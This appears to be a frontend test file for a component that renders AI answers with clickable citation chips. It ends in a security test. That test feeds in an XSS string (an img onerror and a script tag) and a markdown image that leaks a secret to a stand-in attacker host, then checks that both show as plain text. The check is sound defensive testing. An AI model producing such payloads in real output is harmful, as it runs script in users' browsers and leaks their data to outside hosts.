// Component tests for AnswerText: an answer as plain text, with [n] turned into chips only for real sources.
//
// render() draws the component into jsdom; `screen` searches that page. Prefer queries a user would "see":
//   getByRole('button', { name: ... })  >  getByText(...)  >  getByTestId(...) (last resort)
// getBy... throws if nothing (or more than one thing) matches; queryBy... returns null instead (for "is NOT there").
import { render, screen } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { describe, expect, it, vi } from 'vitest'
import AnswerText from './AnswerText'

const citations = [{ n: 1 }, { n: 2 }]

describe('AnswerText', () => {
  it('turns each known [n] into a button', () => {
    render(<AnswerText text="25 days [1], carried over until March [2]." citations={citations} onOpen={() => {}} />)
    expect(screen.getByRole('button', { name: 'Open source 1' })).toBeInTheDocument()
    expect(screen.getByRole('button', { name: 'Open source 2' })).toBeInTheDocument()
  })

  it('leaves a [n] without a matching source as plain text', () => {
    render(<AnswerText text="See [1] and [7]." citations={[{ n: 1 }]} onOpen={() => {}} />)
    expect(screen.queryByRole('button', { name: 'Open source 7' })).not.toBeInTheDocument()
    expect(screen.getByText(/\[7\]/)).toBeInTheDocument()
  })

  it('clicking a chip opens that source', async () => {
    const user = userEvent.setup()
    const onOpen = vi.fn()
    render(<AnswerText text="A [1] B [2]" citations={citations} onOpen={onOpen} />)

    await user.click(screen.getByRole('button', { name: 'Open source 2' }))

    expect(onOpen).toHaveBeenCalledWith(2)
    expect(onOpen).toHaveBeenCalledTimes(1)
  })

  it('marks the open source as pressed', () => {
    render(<AnswerText text="A [1] B [2]" citations={citations} activeN={2} onOpen={() => {}} />)
    expect(screen.getByRole('button', { name: 'Open source 2' })).toHaveAttribute('aria-pressed', 'true')
    expect(screen.getByRole('button', { name: 'Open source 1' })).toHaveAttribute('aria-pressed', 'false')
  })

  // SECURITY: model output is untrusted. HTML in an answer must show as text, never become real elements.
  it('shows HTML and markdown images as plain text', () => {
    const evil = 'Hi <img src=x onerror="alert(1)"> ![x](https://attacker.test/leak?d=secret) <script>alert(2)</script>'
    const { container } = render(<AnswerText text={evil} citations={[]} onOpen={() => {}} />)

    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container).toHaveTextContent('<img src=x onerror="alert(1)">')
    expect(container).toHaveTextContent('![x](https://attacker.test/leak?d=secret)')
  })
})
